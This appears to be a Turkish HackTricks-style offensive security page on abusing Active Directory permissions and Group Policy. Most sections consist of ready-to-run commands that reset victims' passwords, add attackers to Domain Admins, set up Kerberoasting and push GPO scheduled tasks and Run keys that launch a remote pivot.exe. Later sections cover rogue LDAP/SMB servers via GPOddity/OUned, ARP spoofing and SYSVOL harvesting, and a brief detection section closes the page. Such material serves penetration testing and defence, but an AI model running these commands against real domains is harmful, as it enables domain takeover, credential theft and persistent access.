# Active Directory ACL'lerini/ACE'lerini Kötüye Kullanma

{{#include ../../../banners/hacktricks-training.md}}

**Bu sayfa çoğunlukla** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **ve** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges) **adreslerindeki tekniklerin özetidir. Daha fazla bilgi için orijinal makalelere göz atın.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

Silinmiş nesne ACL'lerinin kötüye kullanımı ve hesapların yeniden etkinleştirilmesi hakkında bilgi için [AD Recycle Bin ile bir hesabı yeniden etkinleştirme](../privileged-groups-and-token-privileges.md#reanimating-a-deleted-account-through-delegated-acls) bölümüne bakın.

## **Kullanıcı Üzerinde GenericAll Hakları**

Bu ayrıcalık, saldırgana hedef kullanıcı hesabı üzerinde tam denetim sağlar. `Get-ObjectAcl` komutuyla `GenericAll` haklarının doğrulanmasının ardından saldırgan şunları yapabilir:

- **Hedefin Parolasını Değiştirme**: Saldırgan, `net user <username> <password> /domain` komutunu kullanarak kullanıcının parolasını sıfırlayabilir.
- Linux'tan Samba `net rpc` ile SAMR üzerinden de aynı işlemi yapabilirsiniz:<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

- **Hesap devre dışıysa, UAC bayrağını temizleyin**: `GenericAll`, `userAccountControl` değerini düzenlemeye izin verir. Linux'tan BloodyAD, `ACCOUNTDISABLE` bayrağını kaldırabilir:<sup>[[8]](#references)[[10]](#references)</sup>

```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```

- **Targeted Kerberoasting**: Kullanıcı hesabına bir SPN atayarak hesabı kerberoastable hale getirin, ardından Rubeus ve targetedKerberoast.py kullanarak ticket-granting ticket (TGT) hash’lerini çıkarıp kırmayı deneyin.

```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```

- **Targeted ASREPRoasting**: Kullanıcı için ön kimlik doğrulamayı devre dışı bırakarak hesabını ASREPRoasting'e karşı savunmasız hale getirin.

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- **Shadow Credentials / Key Credential Link**: Bir kullanıcı üzerinde `GenericAll` yetkiniz varsa, parolasını değiştirmeden sertifika tabanlı bir kimlik bilgisi ekleyebilir ve o kullanıcı olarak kimlik doğrulaması yapabilirsiniz. Bkz.:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Grup Üzerinde GenericAll Hakları**

Bu ayrıcalık, saldırganın `Domain Admins` gibi bir grup üzerinde `GenericAll` hakları varsa grup üyeliklerini değiştirmesine olanak tanır. `Get-NetGroup` ile grubun distinguished name değerini belirledikten sonra saldırgan şunları yapabilir:

- **Kendilerini Domain Admins Grubuna Ekleme**: Bu işlem doğrudan komutlarla veya Active Directory ya da PowerSploit gibi modüller kullanılarak yapılabilir.

```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

- Linux'tan, bir grup üzerinde GenericAll/Write membership yetkiniz varsa kendinizi rastgele gruplara eklemek için BloodyAD'den de yararlanabilirsiniz. Hedef grup “Remote Management Users” grubunun içine iç içe geçmişse, bu gruba yetki veren makinelerde hemen WinRM erişimi kazanırsınız:<sup>[[8]](#references)</sup>

```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```

## **Bilgisayar/Kullanıcı Üzerinde GenericAll / GenericWrite / Write**

Bir bilgisayar nesnesi veya kullanıcı hesabı üzerinde bu ayrıcalıklara sahip olmak şunları sağlar:

- **Kerberos Resource-based Constrained Delegation**: Bir bilgisayar nesnesinin ele geçirilmesini sağlar.
- **Shadow Credentials**: Shadow credentials oluşturma ayrıcalıklarından yararlanarak bir bilgisayar veya kullanıcı hesabını taklit etmek için bu tekniği kullanın.

## Devralınan OU izinlerine sahip olacak şekilde nesneyi taşıma

Bir yol, **bir hesap üzerindeki taşıma haklarını** **hedef OU'dan devralınan yazma haklarıyla** birleştirebilir; bu durumda başlangıçta hiçbir sorumlu hesap üzerindeki hassas öznitelikleri değiştiremeyebilir. Kaynak nesnenin taşıma izinlerini ve hedefteki `CreateChild` iznini doğrulayın, nesneyi taşıyın, ardından etkin DACL'ini yeniden kontrol edin. Örneğin, powerview.py'deki `Set-DomainObjectDN -Identity <user> -DestinationDN 'OU=<destination>,DC=<domain>,DC=<tld>'` komutu kullanıcıyı taşır; bu OU üzerinde devralınan `GenericWrite` iznine sahip, kontrolünüzdeki bir grup daha sonra bir [shadow credential](shadow-credentials.md) ekleyebilir. Taşıma işlemi tek başına devralınan izni oluşturmaz.<sup>[[18]](#references)</sup>

Bir OU üzerinde `GenericAll` izniniz varsa ancak uygun bir devralınan ACE yoksa, `bloodyAD --host <dc> -d <domain> -k add genericAll 'OU=<destination>,DC=<domain>,DC=<tld>' <controlled-user>` komutuyla alt öğeler için bir ACE ekleyebilirsiniz. Hedef hesabı ayrıca test edin: **AdminSDHolder korumalı hesaplarda devralma devre dışıdır**; bu nedenle bir OU ACE'si sıradan kullanıcıları etkilerken korumalı bir kullanıcı üzerinde etkisiz kalabilir. Bkz. [AdminSDHolder and SDProp](../privileged-groups-and-token-privileges.md#adminsdholder-group).<sup>[[18]](#references)</sup>

Ayrı bir kötüye kullanım yolu, ayrıcalıklı bir zamanlanmış temizlik betiğinin saldırganın etkileyebildiği ACE'lere göre OU'ları seçmesi ve ardından alt öğeleri üzerinde `Set-ADObject -Clear adminCount` **ve** `$acl.SetAccessRuleProtection($False, $False)` komutlarını çalıştırması durumunda ortaya çıkar. OU DACL'ini değiştirebiliyorsanız, betik tarafından incelenen gruba gerekli `ExtendedRight` veya `GenericAll` ACE'sini verin; görevi çalıştırma izniniz olup olmadığını da ayrıca doğrulayın. Ayrıcalıklı görev, daha önce korunan bir hesapta devralmayı yeniden etkinleştirerek OU ACE'sinin uygulanmasını sağlayabilir. Betiği, tetikleme iznini ve ortaya çıkan DACL'i doğrulayın; yalnızca `adminCount` değerini temizlemek devralmayı yeniden etkinleştirmez ve korumalı gruplarda kalan hesaplar SDProp tarafından yeniden korunabilir.<sup>[[18]](#references)</sup>

## **Group Üzerinde WriteProperty**

Bir kullanıcının belirli bir grup (ör. `Domain Admins`) için tüm nesnelerde `WriteProperty` hakları varsa şunları yapabilir:

- **Kendini Domain Admins Grubuna Ekleme**: `net user` ve `Add-NetGroupUser` komutları birleştirilerek gerçekleştirilebilen bu yöntem, etki alanı içinde ayrıcalık yükseltmeye olanak tanır.

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **Grup üzerinde Self (Self-Membership)**

Bu ayrıcalık, saldırganların grup üyeliğini doğrudan değiştiren komutlarla kendilerini `Domain Admins` gibi belirli gruplara eklemelerine olanak tanır. Aşağıdaki komut dizisi, kendilerini gruba eklemelerini sağlar:

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **WriteProperty (Kendini Üyeliğe Ekleme)**

Benzer bir yetki olan bu özellik, saldırganların gruplar üzerinde `WriteProperty` hakkına sahip olmaları durumunda grup özelliklerini değiştirerek kendilerini doğrudan gruplara eklemelerine olanak tanır. Bu yetkinin doğrulanması ve kullanılması şu şekilde gerçekleştirilir:

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```

## **ForceChangePassword**

Bir kullanıcı üzerinde `User-Force-Change-Password` için `ExtendedRight` yetkisine sahip olmak, mevcut parolayı bilmeden parola sıfırlamaya olanak tanır. Bu yetkinin doğrulanması ve kötüye kullanılması PowerShell veya alternatif komut satırı araçlarıyla yapılabilir. Böylece etkileşimli oturumlar ve etkileşimsiz ortamlar için tek satırlık komutlar dahil, kullanıcının parolasını sıfırlamak için çeşitli yöntemler kullanılabilir. Komutlar basit PowerShell çağrılarından Linux'ta `rpcclient` kullanımına kadar uzanarak saldırı vektörlerinin çok yönlülüğünü gösterir.

```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```

## **Grup üzerinde WriteOwner**

Bir saldırgan bir grup üzerinde `WriteOwner` haklarına sahip olduğunu tespit ederse grubun sahipliğini kendisine verebilir. Bu, özellikle söz konusu grup `Domain Admins` ise büyük etki yaratır; çünkü sahipliği değiştirmek, grup öznitelikleri ve üyeliği üzerinde daha geniş denetim sağlar. Süreç, `Get-ObjectAcl` ile doğru nesneyi belirlemeyi ve ardından sahibi SID veya ad kullanarak değiştirmek için `Set-DomainObjectOwner` komutunu kullanmayı içerir.

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```

## **Kullanıcı üzerinde GenericWrite**

Bu izin, saldırganın kullanıcı özelliklerini değiştirmesine olanak tanır. Özellikle `GenericWrite` erişimiyle saldırgan, kullanıcının oturum açma betiği yolunu değiştirerek kullanıcı oturum açtığında kötü amaçlı bir betiğin çalıştırılmasını sağlayabilir. Bu işlem, hedef kullanıcının `scriptpath` özelliğini saldırganın betiğine işaret edecek şekilde güncellemek için `Set-ADObject` komutu kullanılarak gerçekleştirilir.

```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

Kullanıcının [`scriptPath` attribute](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e) değerine kapsamı daraltılmış bir `WriteProperty` ACE yeterli olabilir; `GenericWrite` gerekli değildir. Bu attribute iznini, etki alanının `SYSVOL\<domain>\scripts` veya `NETLOGON` ağacında yazılabilir bir script ile eşleştirin ve hedef kullanıcının oturum açıp script'e ulaşma olasılığını değerlendirin. Script, oturum açma sırasında o kullanıcının bağlamında çalışır. Etkin AD ve dosya/paylaşım ACL'lerini ayrı ayrı inceleyin; eşleşen bir Allow ACE veya tek başına yazılabilir bir dizin, yolun tamamının kullanılabilir olduğunu göstermez.

## **Group üzerinde GenericWrite**

Bu ayrıcalıkla saldırganlar, kendilerini veya diğer kullanıcıları belirli gruplara eklemek gibi grup üyeliklerini değiştirebilir. Bu işlem bir credential objesi oluşturmayı, bunu kullanarak kullanıcıları gruba eklemeyi veya gruptan çıkarmayı ve üyelik değişikliklerini PowerShell komutlarıyla doğrulamayı içerir.

```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```

- Linux'tan, Samba `net` grup üzerinde `GenericWrite` yetkiniz olduğunda üyeleri ekleyip kaldırabilir (PowerShell/RSAT kullanılamadığında kullanışlıdır):<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

## **WriteDACL + WriteOwner**

Bir AD nesnesinin sahibi olmak ve üzerinde `WriteDACL` ayrıcalıklarına sahip olmak, saldırganın nesne üzerinde kendisine `GenericAll` ayrıcalıkları vermesini sağlar. Bu, ADSI manipülasyonu yoluyla gerçekleştirilir; böylece nesne üzerinde tam denetim elde edilir ve grup üyelikleri değiştirilebilir. Buna rağmen, Active Directory modülünün `Set-Acl` / `Get-Acl` cmdlet'lerini kullanarak bu ayrıcalıklardan yararlanmaya çalışırken bazı kısıtlamalar vardır.<sup>[[4]](#references)[[7]](#references)</sup>

```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

### WriteDACL/WriteOwner ile hızlı kontrolü ele geçirme (PowerView)

Bir kullanıcı veya hizmet hesabı üzerinde `WriteOwner` ve `WriteDacl` izinlerine sahipseniz, eski parolayı bilmeden PowerView kullanarak hesabın tam kontrolünü ele geçirebilir ve parolasını sıfırlayabilirsiniz:

```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```

Notlar:
- Yalnızca `WriteOwner` yetkiniz varsa önce sahibi kendiniz olarak değiştirmeniz gerekebilir:

```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```

- Parola sıfırlamasından sonra herhangi bir protokolle (SMB/LDAP/RDP/WinRM) erişimi doğrulayın.

## **Domain'de Replication (DCSync)**

DCSync saldırısı, bir Domain Controller'ı taklit etmek ve kullanıcı kimlik bilgileri dahil verileri senkronize etmek için domain üzerindeki belirli replication izinlerinden yararlanır. Bu güçlü teknik, saldırganların bir Domain Controller'a doğrudan erişmeden AD ortamından hassas bilgileri çıkarmasına olanak tanıyan `DS-Replication-Get-Changes` gibi izinler gerektirir.<sup>[[5]](#references)</sup> [**DCSync saldırısı hakkında daha fazla bilgi edinin.**](../dcsync.md)

## GPO Delegasyonu <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegasyonu

Group Policy Objects (GPOs) yönetimi için devredilen erişim önemli güvenlik riskleri oluşturabilir. Örneğin, `offense\spotless` gibi bir kullanıcıya GPO yönetim hakları devredilmişse **WriteProperty**, **WriteDacl** ve **WriteOwner** gibi ayrıcalıklara sahip olabilir. PowerView kullanılarak tespit edilen bu izinler kötü amaçlı amaçlarla kötüye kullanılabilir: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### GPO İzinlerini Numaralandırma

Hatalı yapılandırılmış GPO'ları belirlemek için PowerSploit cmdlet'leri birbirine zincirlenebilir. Böylece belirli bir kullanıcının yönetme iznine sahip olduğu GPO'lar keşfedilebilir: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Belirli Bir Politikanın Uygulandığı Bilgisayarlar**: Belirli bir GPO'nun hangi bilgisayarlara uygulandığı çözümlenerek olası etkinin kapsamı anlaşılabilir. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Belirli Bir Bilgisayara Uygulanan Politikalar**: Belirli bir bilgisayara hangi politikaların uygulandığını görmek için `Get-DomainGPO` gibi komutlar kullanılabilir.

**Belirli Bir Politikanın Uygulandığı OU'lar**: Belirli bir politikadan etkilenen organizasyon birimleri (OU'lar), `Get-DomainOU` kullanılarak belirlenebilir.

GPO'ları numaralandırmak ve içlerindeki sorunları bulmak için [**GPOHound**](https://github.com/cogiceo/GPOHound) aracını da kullanabilirsiniz.

### GPO'yu Kötüye Kullanma - New-GPOImmediateTask

Hatalı yapılandırılmış GPO'lar, örneğin anında çalışan zamanlanmış bir görev oluşturarak kod yürütmek için istismar edilebilir. Bu yöntem, etkilenen makinelerde bir kullanıcıyı yerel administrators grubuna eklemek ve ayrıcalıkları önemli ölçüde yükseltmek için kullanılabilir:

```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

### GroupPolicy module - Abuse GPO

GroupPolicy modülü yüklüyse yeni GPO'ların oluşturulup bağlanmasına ve etkilenen bilgisayarlarda backdoor'ları çalıştırmak için kayıt defteri değerleri gibi tercihlerin ayarlanmasına olanak tanır. Bu yöntem, GPO'nun güncellenmesini ve çalıştırma için bir kullanıcının bilgisayarda oturum açmasını gerektirir:

```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```

### SharpGPOAbuse - GPO'yu Kötüye Kullanma

SharpGPOAbuse, yeni GPO'lar oluşturmaya gerek kalmadan görevler ekleyerek veya ayarları değiştirerek mevcut GPO'ları kötüye kullanma yöntemi sunar. Bu araç, değişiklikleri uygulamadan önce mevcut GPO'ların değiştirilmesini veya yeni GPO'lar oluşturmak için RSAT araçlarının kullanılmasını gerektirir:

```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```

### İlke Güncellemesini Zorla

GPO güncellemeleri genellikle yaklaşık her 90 dakikada bir gerçekleşir. Bu süreci hızlandırmak, özellikle bir değişiklik uyguladıktan sonra güncellemeyi hemen yapmak için hedef bilgisayarda `gpupdate /force` komutu kullanılabilir. Bu komut, GPO’larda yapılan değişikliklerin bir sonraki otomatik güncelleme döngüsünü beklemeden uygulanmasını sağlar.

### İşleyişin Ayrıntıları

`Misconfigured Policy` gibi bir GPO için Scheduled Tasks incelendiğinde `evilTask` gibi görevlerin eklendiği doğrulanabilir. Bu görevler, sistem davranışını değiştirmeyi veya ayrıcalıkları yükseltmeyi amaçlayan betikler ya da komut satırı araçları aracılığıyla oluşturulur.

`New-GPOImmediateTask` tarafından oluşturulan XML yapılandırma dosyasında gösterilen görev yapısı, yürütülecek komut ve tetikleyicileri de içeren zamanlanmış görevin ayrıntılarını belirtir. Bu dosya, zamanlanmış görevlerin GPO’lar içinde nasıl tanımlandığını ve yönetildiğini gösterir; ilke uygulamasının parçası olarak rastgele komutlar veya betikler yürütme yöntemi sunar.

### Kullanıcılar ve Gruplar

GPO’lar, hedef sistemlerdeki kullanıcı ve grup üyeliklerinin değiştirilmesine de olanak tanır. Kullanıcılar ve Gruplar ilke dosyaları doğrudan düzenlenerek saldırganlar, kullanıcıları yerel `administrators` grubu gibi ayrıcalıklı gruplara ekleyebilir. Bu, ilke dosyalarının yeni kullanıcılar içerecek veya grup üyeliklerini değiştirecek şekilde düzenlenmesine izin veren GPO yönetim izinlerinin devredilmesiyle mümkün olur.

Kullanıcılar ve Gruplar XML yapılandırma dosyası, bu değişikliklerin nasıl uygulandığını gösterir. Bu dosyaya girdiler eklenerek belirli kullanıcılara etkilenen sistemlerde yükseltilmiş ayrıcalıklar verilebilir. Bu yöntem, GPO manipülasyonu yoluyla ayrıcalıkları yükseltmek için doğrudan bir yol sunar.

Yerel grup üyeliği ve kullanıcı hakları gibi güvenlik ayarları için, uygulanan GPO şablonunu `Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf` yolunda ve `SecEdit` dizininin ACL’sinde de inceleyin. Yazılabilir bir dizin veya dosya, incelenmesi gereken bir bulgudur: değişikliğin etkili olup olmayacağını SYSVOL paylaşımına yönelik etkin erişim, deny ve devralınan ACL’ler, Group Policy container izinleri, ilke kapsamı ve istemci yenilemesi belirler. Yalnızca “GPO Managers” adlı bir gruba üye olmak, düzenleme hakkı olduğunu kanıtlamaz. [Microsoft bu şablon yolunu ve Group Policy container/şablon ayrımını belgeliyor.](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/a600273b-75fc-4ce7-a1a3-ae221e102e91)

Ayrıca logon/logoff script’lerinden yararlanma, autoruns için registry key’lerini değiştirme, .msi dosyalarıyla yazılım yükleme veya service yapılandırmalarını düzenleme gibi kod yürütme ya da kalıcılığı sürdürmeye yönelik ek yöntemler de değerlendirilebilir. Bu teknikler, GPO’ların kötüye kullanılması yoluyla erişimi sürdürmek ve hedef sistemleri kontrol etmek için çeşitli yollar sunar.

### GPC/GPT alımını kimlik doğrulamalı sahte servislere yönlendirme

Bir GPO; meta verileri içeren bir LDAP **Group Policy Container (GPC)** ve ilke dosyalarını barındıran SMB tabanlı bir **Group Policy Template (GPT)** bileşeninden oluşur. Yenileme sırasında istemci, container’ın `gPLink` değerini izler, başvurulan GPC’yi ve `gPCFileSysPath` değerini okur, ardından GPT’yi bu UNC yolundan indirir. Dolayısıyla GPC’nin kendisine veya bir OU, Site ya da Domain’in `gPLink` değerine yazma erişimi, ayrıcalıklı ilke işleme sürecinin kontrolünü sağlayabilir.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### GPOddity ile `gPCFileSysPath` poisoning

Kontrol edilen principal hedef GPC’ye yazabiliyorsa (doğrudan veya **NTLM relay to LDAP** yoluyla), `gPCFileSysPath` değerini saldırganın barındırdığı bir UNC yoluyla değiştirin. [GPOddity](https://github.com/synacktiv/GPOddity), LDAP değişikliğini otomatikleştirir ve Group Policy client’ın `NT AUTHORITY\SYSTEM` olarak yürüttüğü modül tabanlı ilke dosyaları veya Immediate Task içeren kötü amaçlı bir GPT sunar.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

Anonim veya kimlik bilgilerine bağlı olmayan bir SMB paylaşımı, güncel Windows istemcilerinde yeterli değildir: SMB Secure Negotiate, kimlik doğrulamanın başarılı olduğunun kanıtlanmasını gerektirir. Bu nedenle sahte servis, domain kimliğini doğrulamalı, SMB session key’ini türetmeli ve yanıtlarını doğru şekilde imzalamalıdır. Gömülü modda GPOddity’yi kontrol edilen bir machine account ve onun service key’iyle yapılandırın, ardından `[COMMANDS]` bölümünde bilgisayar veya kullanıcı tarafı payload’ını seçin.<sup>[[15]](#references)[[16]](#references)</sup>

```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```

**Kullanıcı GPO uç durumu:** MS16-072 sonrasında Windows, **aynı TCP bağlantısında** hâlâ iki SMB2 oturumu oluşturur: kullanıcı oturumu `GPT.INI` dosyasını, ardından bilgisayar hesabı oturumu `ScheduledTasks.xml` gibi etkin yapılandırma dosyalarını okur. Bu nedenle sahte bir sunucu, kimlik doğrulama durumunu, oturum anahtarlarını ve imzalama anahtarlarını yalnızca sokete göre değil, SMB2 `SessionId` değerine göre de indekslemelidir. GPOddity/OUned içine gömülü Scapy fork'u bunu `SMBStreamSocketMultiplexing` ve çoklama destekli bir `SMBServer` aracılığıyla uygular; tek oturumlu Impacket/Scapy sunucuları aksi hâlde yanlış imzalama durumunu yeniden kullanır ve kullanıcı ilkelerinde başarısız olur.<sup>[[15]](#references)</sup>

#### OUned ile `gPLink` poisoning

Bir OU, Site veya Domain üzerinde `WriteGPLink`, `GenericWrite` ya da eşdeğer denetim yetkisiyle saldırgan, GPC DN'si saldırgan denetimindeki bir LDAP host'u tarafından sunulan bir bağlantı ekleyebilir. Bu yöntem ilk olarak Petros Koutroumpis tarafından tanıtılmıştır; [OUned](https://github.com/synacktiv/OUned), LDAP yazma işlemini ve kötü amaçlı GPC/GPT zincirini otomatikleştirir.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>

```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```

Kurban önce sahte LDAP hizmetinde kimlik doğrulaması yapar ve `gPCFileSysPath` değeri sahte SMB hizmetini gösteren bir GPC alır; ardından SMB'de kimlik doğrulaması yapar ve sağlanan GPT'yi uygular. Bu nedenle OUned, LDAP SPN'ye sahip bir hesap, SMB için HOST SPN'ye sahip bir makine hesabı (aynı makine hesabı her ikisini de karşılayabilir) ve 389 ile 445 numaralı portları operatörün ana bilgisayarına yönlendiren DNS çözümlemesi veya ters yönlendirme gerektirir.<sup>[[15]](#references)[[17]](#references)</sup>

```bash
python3 OUned.py --config config.ini -v
```

OUned’in gömülü Scapy LDAP server’ı Kerberos/SPNEGO’yu gerçek, kontrol edilen service key ile doğrular ve JSON’dan keyfi GPC verisi sunar. Boş JSON key’i rootDSE’yi modeller, `base64:` önekleri binary değerleri temsil eder ve server add/delete/modify/search işlemlerini, ayrıca `BASE`, `LEVEL` ve `SUBTREE` aramalarını destekler; koruma olmadan, integrity veya confidentiality ile anlaşma yapabilir. Böylece bu service, başka bir Windows bileşeni saldırganın kontrolündeki bir LDAP referansını izlerken authenticated LDAP’ta ısrar ettiğinde yeniden kullanılabilir.<sup>[[15]](#references)</sup>

Bir hesabın parolasını dummy bir domaine senkronize etmenin her Kerberos key’ini yeniden oluşturduğunu varsaymayın: RC4 paroladan türetilirken AES string-to-key, principal’ın hostname/domain bilgisinden türetilen bir salt da kullanır. Gerçek hesap AES key’ini `KerberosSSP`’ye vermek, makine hesabının kendi kendine yazabildiği `msDS-SupportedEncryptionTypes` üzerinde tespit edilebilir bir değişiklik yaparak RC4’ü zorlamayı önler.<sup>[[15]](#references)</sup>

#### Tespit için pivot noktaları

`gPCFileSysPath` veya `gPLink` değişikliklerini GPO version değişiklikleriyle ve yeni Immediate/Scheduled Task XML’leriyle ilişkilendirin. Beklenmeyen naming context’lere, onaylı DC/SYSVOL kümesinin dışındaki UNC host’lara giden bağlantıları, makine hesabı adlarını yönlendiren DNS kayıtlarını, alışılmadık makine hesaplarına ait LDAP/CIFS service ticket’larını ve RC4’ü etkinleştiren `msDS-SupportedEncryptionTypes` değişikliklerini araştırın.<sup>[[15]](#references)</sup>

### WriteGPLink + UNC path hijacking (ARP spoofing)

Bir OU/domain üzerinde `WriteGPLink` sahibi olmak, GPO’nun kendisini düzenlemeden hedef container’ın `gPLink` attribute’unu değiştirmenize ve **mevcut bir GPO’yu uygulamaya zorlamanıza** olanak tanır. Bağlanan GPO **UNC path’leri** (`\\HOST\share\...`) üzerinden uzak içeriğe zaten referans veriyorsa bu yöntem ilgi çekici hâle gelir; çünkü authenticated kullanıcılar **SYSVOL**’u okuyabilir ve yeniden kullanılabilir policy’leri çevrimdışı arayabilir.<sup>[[11]](#references)</sup>

Üst düzey iş akışı:

1. Bir OU üzerinde `WriteGPLink` sahibi bir principal belirlemek ve bu OU içindeki bilgisayarları/kullanıcıları listelemek için BloodHound kullanın.
2. `SYSVOL`’u salt okunur şekilde klonlayın ve UNC path’lerine referans veren **Software Installation**, **drive mappings** (`Drives.xml`) ve **logon/startup scripts** aramak için GPO’ları ayrıştırın.
3. DFS/domain-namespace path’leri yerine **doğrudan hostname** kullanan policy’leri (örneğin `\\DC02\share\pkg.msi`) tercih edin; çünkü hostname tabanlı path’leri L2 spoofing ile yönlendirmek daha kolaydır.
4. Kurbanın mevcut policy’yi işlemesi için seçilen GPO GUID’sini hedef OU’nun `gPLink`’ine ekleyin.
5. Aynı broadcast domain üzerinde UNC host’un ARP spoofing’ini yapın ve IP’sini yerel olarak bağlayın (`ip addr add <target_ip>/32 dev <iface>`); böylece kurbanın SMB trafiği sizin host’unuza ulaşır.
6. Beklenen path/filename’i bir saldırgan SMB server’ından (örneğin `smbserver.py`) sunun ve normal policy işleme sürecini bekleyin.

Örnek `SYSVOL` toplama ve GPO ilişkilendirmesi:

```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
